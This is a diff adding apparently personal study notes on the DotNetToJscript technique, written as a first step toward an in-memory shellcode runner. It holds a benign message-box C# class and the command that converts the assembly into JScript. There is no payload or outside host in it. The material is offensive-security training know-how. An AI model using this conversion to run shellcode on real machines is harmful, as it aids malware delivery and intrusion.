@@ -1,0 +1,39 @@
+/* 
+	we’ll use this technique to create our in-memory shellcode runner.
+	we need to download the DotNetToJscript project from GitHub or use the version stored locally at C:\Tools\DotNetToJscript-master.zip on the Windows 10 development machine.
+	We’ll extract it, copy it to our Kali Samba share, and open it in Visual Studio.
+
+*/
+
+/*
+	Let our script be 
+*/
+
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+[ComVisible(true)] 
+public class TestClass
+{
+	public TestClass()
+	{
+		MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+	}
+	public void RunProcess(string path)
+	{
+		Process.Start(path); 
+	}
+}
+
+/* 
+	we are simply executing the MessageBox.Show220 method
+	We have to move some files 
+	1. navigate to the DotNetToJScript folder and copy DotNetToJscript.exe and NDesk.Options.dll to the C:\Tools folder on the Windows 10 development machine
+	2. navigate to the ExampleAssembly folder and also copy ExampleAssembly.dll to C:\Tools
+
+*/
+
+C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
+
+
